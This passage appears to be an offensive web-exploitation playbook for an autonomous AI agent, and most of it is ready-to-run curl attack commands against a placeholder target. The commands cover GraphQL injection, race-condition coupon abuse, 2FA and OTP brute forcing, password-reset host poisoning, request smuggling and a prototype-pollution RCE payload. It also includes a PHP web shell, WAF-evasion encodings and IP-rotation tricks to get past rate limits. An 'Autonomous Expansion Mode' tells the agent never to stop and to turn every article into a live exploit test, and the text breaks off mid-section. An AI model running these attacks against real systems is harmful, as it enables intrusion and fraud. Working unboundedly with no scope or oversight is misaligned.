[32] GRAPHQL VULNERABILITIES — CWE-284, CWE-200
════════════════════════════════════════════════════════════════════════════════════════════

STEP 1: DISCOVER GRAPHQL ENDPOINT
  for ENDPOINT in /graphql /api/graphql /gql /query /v1/graphql /graphql/v1; do
    echo "=== $ENDPOINT ===" && \
    curl -sk -X POST "https://target.com$ENDPOINT" \
      -H "Content-Type: application/json" \
      -d '{"query":"{__typename}"}' | grep -i "typename\|errors\|data"
  done

STEP 2: INTROSPECTION QUERY
  curl -sk -X POST https://target.com/graphql \
    -H "Content-Type: application/json" \
    -d '{"query":"{__schema{types{name,fields{name,type{name}}}}}"}' \
    -o schema.json

  (Read schema.json to understand all available types and fields)

STEP 3: BYPASS DISABLED INTROSPECTION
  curl -sk -X POST https://target.com/graphql \
    -H "Content-Type: application/json" \
    -d '{"query":"{__type(name:\"User\"){fields{name}}}"}' 

STEP 4: IDOR VIA GRAPHQL
  curl -sk -X POST https://target.com/graphql \
    -b "session=YOUR_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"query":"{ user(id: \"VICTIM_USER_ID\") { email, phone, address } }"}'

STEP 5: INJECTION VIA GRAPHQL ARGS
  curl -sk -X POST https://target.com/graphql \
    -H "Content-Type: application/json" \
    -d '{"query":"{ user(id: \"1 OR 1=1\") { name } }"}'

  curl -sk -X POST https://target.com/graphql \
    -H "Content-Type: application/json" \
    -d '{"query":"{ user(name: \"admin\\\" OR \\\"1\\\"=\\\"1\") { id } }"}'

STEP 6: BATCH QUERY (DoS / brute force)
  # Send multiple operations in array to brute force:
  curl -sk -X POST https://target.com/graphql \
    -H "Content-Type: application/json" \
    -d '[{"query":"mutation{login(username:\"admin\",password:\"pass1\")}"},{"query":"mutation{login(username:\"admin\",password:\"pass2\")}"}]'

[37] RACE CONDITIONS — CWE-362
════════════════════════════════════════════════════════════════════════════════════════════

STEP 1: IDENTIFY RACE CONDITION TARGETS
  • Single-use coupon redemption
  • Gift card or credit usage
  • Account balance operations
  • "First-time user" bonuses

STEP 2: PARALLEL CURL REQUESTS (Windows curl limitation → use & for parallel)

  METHOD 1 — Bash parallel (Linux/WSL):
  for i in $(seq 1 20); do
    curl -sk -X POST https://target.com/redeem \
      -b "session=YOUR_TOKEN" \
      -d "coupon=DISCOUNT50" &
  done
  wait
  echo "=== All sent ==="

  METHOD 2 — curl --parallel (curl 7.68+):
  curl --parallel --parallel-max 20 \
    -s -X POST https://target.com/redeem \
    -b "session=TOKEN1" -d "coupon=GIFT123" \
    -s -X POST https://target.com/redeem \
    -b "session=TOKEN1" -d "coupon=GIFT123" \
    -s -X POST https://target.com/redeem \
    -b "session=TOKEN1" -d "coupon=GIFT123"

  METHOD 3 — Write 20 URLs to file and use --parallel:
  # Create urls.txt with 20 identical lines
  curl -K urls.txt --parallel --parallel-max 20

STEP 3: CHECK BALANCE AFTER RACE
  curl -sk https://target.com/api/balance \
    -b "session=YOUR_TOKEN" | grep -i "balance\|credit\|amount"

[40] FILE UPLOAD VULNERABILITIES — CWE-434

  # Create shell.php: <?php system($_GET['cmd']); ?>

[51] SECURITY MISCONFIGURATION — OWASP A05:2021
════════════════════════════════════════════════════════════════════════════════════════════

STEP 1: FULL HEADER AUDIT
  curl -sk -I https://target.com/ | tee /tmp/headers.txt
  grep -iv "x-frame-options\|content-security-policy\|strict-transport-security\|x-content-type-options\|referrer-policy\|permissions-policy" /tmp/headers.txt

  (Flag each missing security header)

STEP 2: COOKIE FLAGS
  curl -sk -I https://target.com/login | grep -i "set-cookie"
  (Check for: Secure, HttpOnly, SameSite=Strict/Lax)

STEP 3: HTTP METHODS
  curl -sk -X OPTIONS https://target.com/ -i | grep -i "allow"
  curl -sk -X TRACE https://target.com/ -i | head -20   (XST attack if TRACE enabled)
  curl -sk -X PUT https://target.com/test.txt -d "test" -i | grep -i "405\|201\|200"

STEP 4: TLS CONFIGURATION
  curl -sk --tlsv1.0 https://target.com/ -o /dev/null -w "TLS1.0: %{http_code}\n"
  curl -sk --tlsv1.1 https://target.com/ -o /dev/null -w "TLS1.1: %{http_code}\n"
  curl -sk --tlsv1.2 https://target.com/ -o /dev/null -w "TLS1.2: %{http_code}\n"
  curl -sk --tlsv1.3 https://target.com/ -o /dev/null -w "TLS1.3: %{http_code}\n"

STEP 5: SERVER VERSION DISCLOSURE
  curl -sk -I https://target.com/ | grep -i "server:\|x-powered-by:"

STEP 6: SENSITIVE HTTP HEADERS DISCLOSURE
  curl -sk -I https://target.com/ | grep -i "x-aspnet\|x-aspnetmvc\|x-drupal\|x-wp-"

════════════════════════════════════════════════════════════════════════════════════════════
[52] SENSITIVE DATA EXPOSURE / INFORMATION DISCLOSURE — CWE-200
════════════════════════════════════════════════════════════════════════════════════════════

STEP 1: COMMON EXPOSED FILE SCAN
  PATHS=(
    "/.env" "/.env.local" "/.env.production" "/.env.bak" "/.env.backup"
    "/.git/config" "/.git/HEAD" "/.git/COMMIT_EDITMSG"
    "/.svn/entries" "/.hg/hgrc"
    "/web.config" "/app.config" "/config.php" "/config.yml" "/config.json"
    "/phpinfo.php" "/info.php" "/test.php" "/debug.php"
    "/server-status" "/server-info"
    "/actuator" "/actuator/env" "/actuator/heapdump" "/actuator/mappings"
    "/swagger.json" "/swagger-ui.html" "/api-docs" "/openapi.json" "/openapi.yaml"
    "/v2/api-docs" "/v3/api-docs"
    "/__debugbar" "/_profiler" "/_profiler/phpinfo"
    "/telescope" "/telescope/requests"
    "/horizon" "/horizon/api/stats"
    "/sidekiq" "/sidekiq/dashboard"
    "/flower" "/kibana" "/grafana"
    "/wp-admin/admin-ajax.php" "/wp-config.php"
    "/adminer.php" "/phpmyadmin/" "/pma/"
    "/robots.txt" "/sitemap.xml" "/crossdomain.xml" "/clientaccesspolicy.xml"
    "/.DS_Store" "/thumbs.db"
    "/backup.zip" "/backup.tar.gz" "/backup.sql" "/db.sql"
    "/dump.sql" "/database.sql" "/site.zip"
    "/package.json" "/package-lock.json" "/composer.json" "/yarn.lock"
    "/Dockerfile" "/docker-compose.yml" "/.dockerenv"
    "/Gemfile" "/requirements.txt" "/pom.xml"
    "/WEB-INF/web.xml" "/WEB-INF/applicationContext.xml"
    "/.well-known/security.txt"
  )

  for PATH_CHECK in "${PATHS[@]}"; do
    STATUS=$(curl -sk -o /dev/null -w "%{http_code}" "https://target.com$PATH_CHECK")
    if [ "$STATUS" = "200" ] || [ "$STATUS" = "301" ] || [ "$STATUS" = "302" ]; then
      echo "[FOUND $STATUS] https://target.com$PATH_CHECK"
    fi
  done

STEP 2: JS BUNDLE SECRET SCAN
  # Get JS bundle URL first:
  curl -sk https://target.com/ | grep -oP 'src="([^"]*\.js)"' | head -20

  # Download and search for secrets:
  curl -sk "https://target.com/static/js/main.chunk.js" | \
    grep -iE "(api_?key|apikey|secret|token|password|Authorization|AWS|firebase|AKIA|AIza|SG\.|ghp_|gho_|slack|twilio|stripe|pk_live|sk_live)" | \
    head -50

  # Check for source maps (leaks original source):
  curl -sk "https://target.com/static/js/main.chunk.js.map" | head -100

STEP 3: __NEXT_DATA__ EXPOSURE (Next.js)
  curl -sk https://target.com/ | grep -o '__NEXT_DATA__.*</script>' | head -c 5000

STEP 4: DIRECTORY LISTING
  curl -sk https://target.com/uploads/ | grep -i "index of\|parent directory"
  curl -sk https://target.com/static/ | grep -i "index of\|parent directory"
  curl -sk https://target.com/backup/ | grep -i "index of\|parent directory"

STEP 5: GIT REPO EXPOSURE
  curl -sk https://target.com/.git/config | grep -i "url\|repositoryformatversion"
  curl -sk https://target.com/.git/HEAD
  curl -sk https://target.com/.git/COMMIT_EDITMSG

════════════════════════════════════════════════════════════════════════════════════════════
[60] CORS MISCONFIGURATION — CWE-942
════════════════════════════════════════════════════════════════════════════════════════════

STEP 1: CHECK CORS POLICY
  curl -sk -I "https://target.com/api/user" \
    -H "Origin: https://evil.com" | grep -i "access-control"

STEP 2: TEST ARBITRARY ORIGIN REFLECTION
  curl -sk -I "https://target.com/api/profile" \
    -H "Origin: https://attacker.com" \
    -b "session=YOUR_TOKEN" | grep -i "access-control-allow-origin"

  IF response: Access-Control-Allow-Origin: https://attacker.com → EXPLOITABLE

STEP 3: NULL ORIGIN TEST
  curl -sk -I "https://target.com/api/profile" \
    -H "Origin: null" \
    -b "session=YOUR_TOKEN" | grep -i "access-control"

STEP 4: SUBDOMAIN BYPASS
  curl -sk -I "https://target.com/api/profile" \
    -H "Origin: https://evil.target.com" \
    -b "session=YOUR_TOKEN" | grep -i "access-control"

  curl -sk -I "https://target.com/api/profile" \
    -H "Origin: https://target.com.evil.com" \
    -b "session=YOUR_TOKEN" | grep -i "access-control"

STEP 5: CHECK CREDENTIALS ALLOWED
  curl -sk -I "https://target.com/api/profile" \
    -H "Origin: https://attacker.com" \
    -b "session=YOUR_TOKEN" | grep -i "access-control-allow-credentials"

  IF: Allow-Origin: attacker.com + Allow-Credentials: true → Full CORS exploit possible

STEP 6: VERIFY EXPLOITABILITY
  curl -sk "https://target.com/api/profile" \
    -H "Origin: https://attacker.com" \
    -H "Access-Control-Request-Method: GET" \
    -b "session=YOUR_TOKEN"

════════════════════════════════════════════════════════════════════════════════════════════
[38] SUBDOMAIN TAKEOVER — CWE-284
════════════════════════════════════════════════════════════════════════════════════════════

STEP 1: CHECK SUBDOMAIN CNAME
  curl -sk https://sub.target.com -i | head -20
  curl -sk "https://sub.target.com" -o /dev/null -w "Status: %{http_code}\n"

STEP 2: IDENTIFY DANGLING CNAME
  # If curl returns specific strings, subdomain may be takeable:
  curl -sk https://sub.target.com | grep -i \
    "there isn't a github pages site\|heroku.*no such app\|NoSuchBucket\|no such app\|this shop is currently unavailable\|404 not found\|domain not configured\|unrecognized domain"

STEP 3: SERVICE-SPECIFIC CHECKS
  GitHub Pages:
  curl -sk https://sub.target.com | grep -i "github"

  AWS S3:
  curl -sk https://sub.target.com | grep -i "NoSuchBucket\|The specified bucket does not exist"

  Heroku:
  curl -sk https://sub.target.com | grep -i "No such app"

  Fastly:
  curl -sk https://sub.target.com | grep -i "Fastly error"

  Zendesk:
  curl -sk https://sub.target.com | grep -i "Help Center Closed"

════════════════════════════════════════════════════════════════════════════════════════════
[62] WEAK PASSWORD RESET — CWE-640
════════════════════════════════════════════════════════════════════════════════════════════

STEP 1: TOKEN ENTROPY CHECK (request multiple tokens)
  curl -sk -X POST https://target.com/forgot-password \
    -d "email=test@target.com" -i | grep -i "token\|reset\|link"

  (Repeat 5 times and compare tokens — sequential/short = predictable)

STEP 2: HOST HEADER POISONING
  curl -sk -X POST https://target.com/forgot-password \
    -H "Host: attacker.com" \
    -d "email=victim@target.com" -i

  curl -sk -X POST https://target.com/forgot-password \
    -H "X-Forwarded-Host: attacker.com" \
    -d "email=victim@target.com" -i

STEP 3: PARAMETER POLLUTION
  curl -sk -X POST https://target.com/forgot-password \
    -d "email=victim@target.com&email=attacker@evil.com"

  curl -sk -X POST https://target.com/forgot-password \
    -H "Content-Type: application/json" \
    -d '{"email":"victim@target.com","email":"attacker@evil.com"}'

STEP 4: TOKEN REUSE TEST
  curl -sk -X POST https://target.com/reset-password \
    -d "token=VALID_TOKEN&password=newpass123"
  # Use same token again:
  curl -sk -X POST https://target.com/reset-password \
    -d "token=VALID_TOKEN&password=anotherpass456"
  (If 200 on second use → token not invalidated)

════════════════════════════════════════════════════════════════════════════════════════════
[63/64] 2FA BYPASS / OTP BRUTE FORCE — CWE-287
════════════════════════════════════════════════════════════════════════════════════════════

STEP 1: SKIP 2FA — DIRECT DASHBOARD ACCESS
  # Login with valid credentials:
  curl -sk -X POST https://target.com/login \
    -d "username=test&password=pass" -c cookies.txt -i

  # Before entering 2FA, try to access dashboard directly:
  curl -sk https://target.com/dashboard -b cookies.txt | grep -i "welcome\|forbidden\|2fa"

STEP 2: OTP BRUTE FORCE (check rate limiting)
  # Test if rate limiting exists — try 5 wrong codes quickly:
  for CODE in 000001 000002 000003 000004 000005; do
    echo "=== Code: $CODE ===" && \
    curl -sk -X POST https://target.com/verify-otp \
      -b cookies.txt \
      -d "otp=$CODE" -i | grep -i "invalid\|expired\|attempts\|locked\|correct"
  done

  (If no "too many attempts" message → no rate limiting → OTP brute forceable)

STEP 3: OTP REUSE
  curl -sk -X POST https://target.com/verify-otp \
    -b cookies.txt \
    -d "otp=VALID_OTP_YOU_JUST_USED"
  (If 200 → OTP not invalidated after use)

STEP 4: RESPONSE MANIPULATION CHECK
  curl -sk -X POST https://target.com/verify-otp \
    -b cookies.txt \
    -d "otp=000000" -i | grep -i "false\|invalid\|success\|status"

  (Document: {"valid":false} → in Burp, change to {"valid":true} = 2FA bypass PoC)

════════════════════════════════════════════════════════════════════════════════════════════
[33] HTTP REQUEST SMUGGLING — CWE-444
════════════════════════════════════════════════════════════════════════════════════════════

STEP 1: DETECT DISCREPANCY
  # CL.TE Probe (Content-Length front-end, Transfer-Encoding back-end):
  curl -sk --http1.1 -X POST https://target.com/ \
    -H "Content-Length: 6" \
    -H "Transfer-Encoding: chunked" \
    -d "0\r\n\r\nX" \
    -i -o /dev/null -w "Status: %{http_code}\n"

  # TE.CL Probe:
  curl -sk --http1.1 -X POST https://target.com/ \
    -H "Transfer-Encoding: chunked" \
    -H "Content-Length: 3" \
    --data-binary $'8\r\nSMUGGLED\r\n0\r\n\r\n' \
    -i -o /dev/null -w "Status: %{http_code}\n"

STEP 2: TIMING-BASED DETECTION
  curl -sk --http1.1 -X POST https://target.com/ \
    -H "Content-Length: 4" \
    -H "Transfer-Encoding: chunked" \
    --data-binary $'1\r\nA\r\n' \
    --max-time 10 \
    -w "Time: %{time_total}s | Code: %{http_code}\n" \
    -o /dev/null

  (If >5s timeout → server waiting for more of chunked body = CL.TE confirmed)

════════════════════════════════════════════════════════════════════════════════════════════
[46] PROTOTYPE POLLUTION SERVER-SIDE — CWE-1321
════════════════════════════════════════════════════════════════════════════════════════════

STEP 1: VIA JSON BODY
  curl -sk -X POST https://target.com/api/settings \
    -H "Content-Type: application/json" \
    -b "session=YOUR_TOKEN" \
    -d '{"__proto__":{"admin":true}}' \
    -i | grep -i "admin\|role\|privilege"

  curl -sk -X POST https://target.com/api/settings \
    -H "Content-Type: application/json" \
    -d '{"constructor":{"prototype":{"admin":true}}}' -i

STEP 2: VIA QUERY STRING
  curl -sk "https://target.com/api/settings?__proto__[admin]=true" \
    -b "session=YOUR_TOKEN" -i | grep -i "admin"

  curl -sk "https://target.com/api/settings?constructor[prototype][admin]=true" \
    -b "session=YOUR_TOKEN" -i

STEP 3: RCE VIA PROTOTYPE POLLUTION (Node.js)
  curl -sk -X POST https://target.com/api/merge \
    -H "Content-Type: application/json" \
    -d '{"__proto__":{"shell":"node -e \"require('"'"'child_process'"'"').exec('"'"'id'"'"',console.log)\"","NODE_OPTIONS":"--require /proc/self/fd/0"}}'

════════════════════════════════════════════════════════════════════════════════════════════
[55] DEFAULT CREDENTIALS & EXPOSED ADMIN PANELS
════════════════════════════════════════════════════════════════════════════════════════════

ADMIN PANEL DISCOVERY:
  ENDPOINTS=(
    "/admin" "/administrator" "/admin/login" "/admin/dashboard"
    "/manage" "/management" "/backend" "/control" "/cpanel"
    "/wp-admin" "/wp-login.php"
    "/phpmyadmin" "/pma" "/adminer.php"
    "/jenkins" "/jenkins/login"
    "/grafana" "/grafana/login"
    "/kibana" "/kibana/app/home"
    "/portainer" "/portainer/#/auth"
    "/prometheus" "/prometheus/graph"
    "/netdata" "/api/v1/info"
    "/flower" "/flower/dashboard"
    "/rabbitmq" "/rabbitmq/#/login"
    "/jira" "/jira/login.jsp"
    "/confluence"
    "/_cat/indices"   (Elasticsearch no-auth)
    "/solr/admin"
    "/mongo-express"
  )

  for EP in "${ENDPOINTS[@]}"; do
    STATUS=$(curl -sk -o /dev/null -w "%{http_code}" "https://target.com$EP")
    [ "$STATUS" != "404" ] && echo "[HTTP $STATUS] https://target.com$EP"
  done

DEFAULT CREDENTIAL TEST:
  curl -sk -X POST https://target.com/admin/login \
    -d "username=admin&password=admin" -c admin_cookies.txt -i | \
    grep -i "welcome\|dashboard\|invalid\|incorrect"

  curl -sk -X POST https://target.com/jenkins/j_spring_security_check \
    -d "j_username=admin&j_password=admin" -c admin_cookies.txt -i

  # Elasticsearch no-auth check:
  curl -sk "https://target.com:9200/_cat/indices"
  curl -sk "https://target.com:9200/_all"

  # MongoDB no-auth:
  curl -sk "http://target.com:27017/"

════════════════════════════════════════════════════════════════════════════════════════════
[65-68] COOKIE & CSP ANALYSIS
════════════════════════════════════════════════════════════════════════════════════════════

FULL COOKIE AUDIT:
  curl -sk -i https://target.com/login -X POST \
    -d "username=test&password=test" | grep -i "set-cookie"

  Check each cookie for:
  1. HttpOnly flag (missing = JS can steal it)
  2. Secure flag (missing = sent over HTTP)
  3. SameSite (missing/None = CSRF possible)
  4. Expiry (session vs persistent)
  5. Path scope (too broad = accessible to other apps)

CSP ANALYSIS:
  curl -sk -I https://target.com/ | grep -i "content-security-policy"

  ANALYZE OUTPUT:
  • 'unsafe-inline' present → XSS possible
  • 'unsafe-eval' present → eval()-based XSS
  • No script-src → no JS restriction
  • Wildcard: *.googleapis.com → JSONP CSP bypass possible
  • Missing base-uri → base tag injection possible
  • Missing frame-ancestors → clickjacking possible

════════════════════════════════════════════════════════════════════════════════════════════
          CURL SELF-HEALING & DIAGNOSTIC DECISION TREE
════════════════════════════════════════════════════════════════════════════════════════════

WHEN CURL FAILS — DIAGNOSE AND FIX:

  curl: (6) Could not resolve host
    → DNS issue
    FIX 1: curl --dns-servers 8.8.8.8 https://target.com
    FIX 2: curl --resolve target.com:443:X.X.X.X https://target.com
    FIX 3: Verify target is correct: curl http://target.com (try http first)
    FIX 4: Try www prefix: curl https://www.target.com

  curl: (7) Failed to connect to port 443
    → Port closed or firewall
    FIX 1: Try port 80: curl http://target.com:80
    FIX 2: Try port 8443: curl https://target.com:8443
    FIX 3: Try port 8080: curl http://target.com:8080
    FIX 4: curl -v https://target.com (check if TLS handshake starts)

  curl: (35) SSL connect error / SSL_ERROR_SYSCALL
    → TLS version mismatch or cert issue
    FIX 1: curl -k https://target.com (ignore SSL errors)
    FIX 2: curl --tlsv1.2 https://target.com
    FIX 3: curl --tlsv1.3 https://target.com
    FIX 4: curl --ssl-no-revoke https://target.com (Windows)

  curl: (52) Server returned nothing (no headers, no data)
    → Server closed connection unexpectedly
    FIX 1: curl --http1.1 https://target.com
    FIX 2: curl --http1.0 https://target.com
    FIX 3: curl -H "Connection: keep-alive" https://target.com

  curl: (56) Recv failure / Connection reset by peer
    → WAF or IDS closing connection
    FIX 1: Add legitimate User-Agent: curl -A "Mozilla/5.0..." https://target.com
    FIX 2: Add delay: curl --limit-rate 10k (slow = less suspicious)
    FIX 3: Route through proxy: curl -x http://127.0.0.1:8080 https://target.com
    FIX 4: Try HTTP/2: curl --http2 https://target.com

  HTTP 400 Bad Request
    → Malformed request
    FIX 1: Check headers for special characters
    FIX 2: Try without custom headers
    FIX 3: URL-encode special chars in parameters
    FIX 4: Try different Content-Type

  HTTP 401 Unauthorized
    → Auth required
    FIX 1: Add session cookie: -b "session=TOKEN"
    FIX 2: Add Bearer token: -H "Authorization: Bearer TOKEN"
    FIX 3: Try Basic auth: -u user:pass
    FIX 4: Try empty creds: -u :

  HTTP 403 Forbidden
    → See PHASE 0.5: 403 BYPASS MASTER GUIDE above

  HTTP 429 Too Many Requests
    → Rate limited
    FIX 1: Add delay between requests: sleep 2
    FIX 2: Rotate IP: -H "X-Forwarded-For: $(shuf -i 1-254 -n 1).$(shuf -i 1-254 -n 1).$(shuf -i 1-254 -n 1).$(shuf -i 1-254 -n 1)"
    FIX 3: Use different session token
    FIX 4: Try from different parameter

  HTTP 500 Internal Server Error
    → Potential vulnerability (injection, parsing error)
    → DOCUMENT IT — server-side error from your input = likely exploitable
    FIX 1: Simplify payload to identify which part triggers it
    FIX 2: Try variants of the triggering input

  PAYLOAD NOT REFLECTED:
    → WAF stripping input
    FIX 1: URL encode: %3C for <, %3E for >, %22 for "
    FIX 2: Double encode: %253C for <
    FIX 3: HTML entities: &#60; for <
    FIX 4: Hex: \x3c for <
    FIX 5: Unicode: \u003c for <
    FIX 6: JSON Unicode: \u003cscript\u003e
    FIX 7: Case variation: ScRiPt instead of script
    FIX 8: Alternative payload vector (try another vuln type)
    FIX 9: Check curl --help all for --data-urlencode option

  GET CURL HELP PAGE WHEN STUCK:
    curl --help all         (all flags)
    curl --help category    (categories: auth, connection, dns, http, output, etc.)
    curl --manual           (full manual)

════════════════════════════════════════════════════════════════════════════════════════════
               QUICK DECISION TREE — URL PATTERN → CURL TESTS
════════════════════════════════════════════════════════════════════════════════════════════

URL PATTERN                          CURL TEST PRIORITY
──────────────────────────────────────────────────────────────────────────────────────────
?id=1, ?user_id=, ?order=            curl -sk .../endpoint?id=1' (SQLi [15])
                                     curl -sk .../user/1002 (IDOR [25])
?q=, ?search=, ?input=               curl -sk ...?q=%3Cscript%3Ealert(1)%3C/script%3E (XSS [01])
                                     curl -sk ...?q=1%27 (SQLi [15])
?redirect=, ?next=, ?url=            curl -sk -I ...?redirect=https://evil.com (Open Redirect [04])
                                     curl -sk ...?url=http://169.254.169.254/ (SSRF [19])
?file=, ?path=, ?include=            curl -sk .../file?path=../../../../etc/passwd (LFI [21])
?name=, ?template=, ?msg=            curl -sk ...?name=%7B%7B7*7%7D%7D → check for 49 (SSTI [17])
?cmd=, ?exec=, ?host=, ?ping=        curl -sk ...?host=127.0.0.1%3Bid (RCE [20])
?callback=                           curl -sk ...?callback=alert (JSONP [13])
?format=xml or SOAP endpoint         curl -sk -X POST with XXE payload (XXE [18])
/graphql                             curl -sk -X POST with introspection query (GraphQL [32])
Login form                           curl -sk -X POST username=admin'-- (SQLi/Auth [15,27])
Password reset form                  curl -sk -H "Host: attacker.com" (Host Header [35])
Any endpoint that returns Set-Cookie curl -sk -I | grep set-cookie (Cookie audit [65])
Any response headers page            curl -sk -I | grep all security headers (Misconfig [51])
File upload                          curl -sk -F "file=@shell.php;type=image/jpeg" (Upload [40])
No params at all → do recon:
  curl -sk https://target.com/ → Read headers
  curl -sk -I https://target.com/ → Check for missing security headers
  curl -sk https://target.com/.env → Exposed config
  curl -sk https://target.com/.git/config → Source code
  curl -sk https://target.com/swagger.json → API surface
  curl -sk https://target.com/api/ → API enumeration

════════════════════════════════════════════════════════════════════════════════════════════
              REPORTING TEMPLATE (curl-based PoC)
════════════════════════════════════════════════════════════════════════════════════════════

Title: [Vuln Type] in [Parameter/Endpoint]
Severity: Critical / High / Medium / Low / Informational
CWE: CWE-XXX
CVSS: X.X

Summary:
  [What the vulnerability is and what an attacker can do]

Reproduction (curl PoC):
  curl -sk [FLAGS] "[URL WITH PAYLOAD]" [OUTPUT OPTIONS]

Expected Result:
  HTTP [STATUS CODE] — [What appears in response proving the vulnerability]

Actual Result:
  [Paste relevant curl output here]

Impact:
  [Data at risk, affected users, business impact]

Remediation:
  [Specific, actionable fix]

References:
  OWASP: https://owasp.org/Top10/
  CWE: https://cwe.mitre.org/data/definitions/[NUM].html

════════════════════════════════════════════════════════════════════════════════════════════

================================================================================
  AUTONOMOUS EXPANSION MODE
================================================================================
 
This section activates when the agent has exhausted all knowledge base phases,
or when the target requires techniques not covered by the structured playbook.
 
 
--------------------------------------------------------------------------------
TRIGGER CONDITIONS
--------------------------------------------------------------------------------
 
Activate Autonomous Expansion Mode when ANY of the following is true:
 
  - All Phase 1-6 tests have been run with no new findings in two full passes
  - A technology, framework, or behavior is encountered with no matching playbook
  - A partial finding exists that needs a custom exploit not covered above
  - The target has unusual behavior suggesting a non-standard vulnerability class
 
Once triggered, do not stop until 3 full autonomous research loops complete
with no new attack surface found, or the request limit is reached.
 
 
--------------------------------------------------------------------------------
AUTONOMOUS RESEARCH LOOP
--------------------------------------------------------------------------------
 
STEP A — TECHNOLOGY-DRIVEN RESEARCH
--------------------------------------
 
For every technology fingerprinted on the target, run a targeted web search
using these patterns. Adapt the [technology], [version], and [framework]
placeholders to what was actually discovered on the target.
 
Search patterns to use:
  "[technology] [version] vulnerability 2024"
  "[technology] CVE exploit writeup"
  "[framework] security misconfiguration site:hackerone.com"
  "[framework] bug bounty findings site:medium.com"
  "[CMS or library] RCE OR SSRF OR XSS writeup"
  "site:portswigger.net/research [technology]"
  "site:bishopfox.com [technology] vulnerability"
  "[endpoint pattern observed] security vulnerability"
 
Example searches (substitute real target tech):
  web_search("Next.js 14 security vulnerabilities 2024")
  web_search("Cloudflare Workers bypass techniques writeup")
  web_search("GraphQL batching attack real world exploit")
  web_search("PostMessage origin validation bypass writeup site:medium.com")
 
After each search:
  1. Fetch the most relevant article in full using web_fetch
  2. Extract the exact technique described
  3. Adapt it to the target's specific endpoints and parameters
  4. Immediately test it with curl
  5. Log result and move to next
 
Rule: Never read an article without acting on it.
      Every research session must end with at least one new curl test.
 
 
STEP B — DISCLOSED REPORT MINING (HackerOne / YesWeHack / Bugcrowd)
----------------------------------------------------------------------
 
Search for publicly disclosed reports on the same company or technology stack.
Developers repeat the same mistake patterns across their codebase — disclosed
reports are a map of where they got lazy before.
 
Search patterns to use:
  web_search("hackerone disclosed reports [target company name]")
  web_search("site:hackerone.com/reports [technology or framework]")
  web_search("yeswehack writeup [technology]")
  web_search("[company name] bug bounty writeup site:medium.com")
  web_search("[company name] security vulnerability disclosure")
  web_search("intigriti writeup [technology or company]")
 
For each report found:
  1. Read the full report
  2. Extract the exact vulnerability pattern (not just the class — the specific
     parameter type, endpoint pattern, or behavior that was exploited)
  3. Search for the same pattern on the current target
  4. Test with adapted payloads using curl
  5. If the original report affected v1 of an API, check if v2 has the same issue
 
 
STEP C — PORTSWIGGER & TOP RESEARCH BLOG LEARNING
---------------------------------------------------
 
When encountering unfamiliar behavior, search authoritative security research
sources before giving up. The most valuable findings come from techniques that
are publicly documented but rarely tested.
 
Trusted research sources to query (in priority order):
 
  1. PortSwigger Web Security Academy & Research Blog
       web_search("portswigger [behavior or response pattern] exploit")
       web_fetch("https://portswigger.net/research")
 
  2. Assetnote Research Blog
       web_search("site:blog.assetnote.io [technology]")
 
  3. WatchTowr Labs
       web_search("site:labs.watchtowr.com [technology]")
 
  4. SRC:INC Research
       web_search("site:srcincite.io [technology or vuln class]")
 
  5. Bishop Fox Blog
       web_search("site:bishopfox.com/blog [technology]")
 
  6. ProjectDiscovery Blog
       web_search("site:blog.projectdiscovery.io [technology]")
 
  7. Intigriti Bug Bytes
       web_search("intigriti bug bytes [technology] writeup")
 
  8. GitHub CVE PoC Repositories
       web_search("site:github.com [technology] CVE PoC")
       web_search("site:github.com [technology] exploit [year]")
 
  9. Medium (bug bounty tagged)
       web_search("[technology] vulnerability writeup site:medium.com")
       web_search("[company name] bug bounty hall of fame writeup")
 
After reading any research post:
  - Extract the technique precisely
  - Do not summarize and skip — implement it
  - Adapt curl commands from the article to the live target
  - If the article describes a Burp technique, replicate it manually in curl
 
 
STEP D — BEHAVIOR-DRIVEN FUZZING
----------------------------------
 
When no vulnerability is found but something feels off (slow response, different
response sizes, unexpected field names, partial data returned), escalate with
systematic behavior-driven fuzzing.
 
RESPONSE TIME ANOMALY (potential blind injection):
  Establish a baseline response time first:
    curl -sk https://target.com/endpoint -w "Time: %{time_total}s\n" -o /dev/null
 
  Then inject time-delay payloads:
    MySQL:      SLEEP(5)
    MSSQL:      WAITFOR DELAY '0:0:5'
    PostgreSQL: pg_sleep(5)
    Java:       Thread.sleep(5000)
    MongoDB:    {"$where":"sleep(5000)"}
    Generic:    ; sleep 5 (command injection)
 
  If response time delta > 4s compared to baseline, injection point confirmed.
 
UNDOCUMENTED PARAMETER DISCOVERY:
  Developers often leave debug or internal flags active in production.
  Test with extra JSON fields that a backend might silently process:
 
    curl -sk -X POST https://target.com/api/endpoint \
      -H "Content-Type: application/json" \
      -b "session=TOKEN" \
      -d '{"debug":true,"verbose":true,"test":true,"admin":true,"internal":true,
           "preview":true,"bypass":true,"override":true,"dev":true,"force":true}'
 
  Watch for ANY change in response shape, length, or content.
  A field that changes behavior is an undocumented parameter — test it fully.
 
TYPE CONFUSION FUZZING:
  Send unexpected types for every known parameter.
  Developers test the happy path. They rarely test wrong types.
 
  String where integer expected:   "id": "1 OR 1=1"
  Array where string expected:     "username": ["admin", "user"]
  Object where string expected:    "email": {"$gt": ""}
  Boolean inversion:               "active": true / false / null
  Null value:                      "token": null
  Negative number:                 "amount": -999
  Zero:                            "quantity": 0
  Oversized input:                 "name": "A" repeated 10000 times
  Float where int expected:        "price": 0.001
  Unicode:                         "name": "\u0000admin"
  Empty string:                    "password": ""
  Whitespace only:                 "username": "   "
 
  Document any 500 error, stack trace, or behavioral change triggered.
  A 500 from your input is a confirmed bug — keep simplifying to find the root.
 
HTTP VERB TAMPERING ON EVERY ENDPOINT:
  Test every discovered endpoint with all HTTP methods.
  Authorization is often only applied to the expected method.
 
    for METHOD in GET POST PUT PATCH DELETE OPTIONS HEAD TRACE CONNECT; do
      echo "=== $METHOD ===" && \
      curl -sk -X $METHOD https://target.com/api/[endpoint] \
        -b "session=TOKEN" -i | head -5
    done
 
  Flag any method that returns 200 where 405 was expected.
  Flag any method that returns different data than GET.
 
 
STEP E — SOURCE CODE & PASSIVE ASSET INTELLIGENCE
----------------------------------------------------
 
If no session-based or parameter-based findings emerge, pivot to passive
intelligence gathering. This often uncovers the attack surface that no one else
tested because it requires reading, not scanning.
 
JAVASCRIPT DEEP DIVE:
  Download every JS file discovered during Phase 2. For each file search for:
 
  Internal hostnames and staging URLs:
    grep -iE "(staging|dev|internal|qa|test|uat)\.(target\.com|[a-z]+\.com)" bundle.js
 
  S3 bucket names:
    grep -iE "s3\.amazonaws\.com|\.s3\." bundle.js
 
  Hardcoded credentials:
